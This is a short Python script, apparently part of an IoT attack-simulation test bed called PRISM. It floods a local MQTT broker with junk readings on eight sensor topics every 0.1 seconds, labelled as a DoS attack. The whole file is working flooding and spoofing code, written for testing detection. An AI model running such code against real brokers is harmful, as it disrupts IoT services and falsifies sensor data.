import paho.mqtt.client as mqtt
import time
import json
from datetime import datetime

# MQTT Broker settings
BROKER = "localhost"
PORT = 1883

client = mqtt.Client()
client.connect(BROKER, PORT)
client.loop_start()

print("=" * 40)
print("PRISM ATTACK SIMULATION — DoS Attack")
print("Flooding MQTT broker with messages...")
print("=" * 40)

count = 0
try:
    while True:
        # Flood all sensor topics with junk data
        for topic in ["sensor/temperature", "sensor/humidity",
                      "sensor/cpu_load", "sensor/network_traffic",
                      "sensor/power_consumption", "sensor/motion",
                      "sensor/door_access", "sensor/packet_loss"]:
            payload = json.dumps({
                "device": topic,
                "value": 9999,
                "timestamp": datetime.now().isoformat(),
                "attack": "DoS"
            })
            client.publish(topic, payload)
            count += 1
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Messages sent: {count}")
        time.sleep(0.1)  # Flood every 0.1 seconds

except KeyboardInterrupt:
    print(f"\nDoS Attack stopped. Total messages sent: {count}")
    client.loop_stop()
    client.disconnect()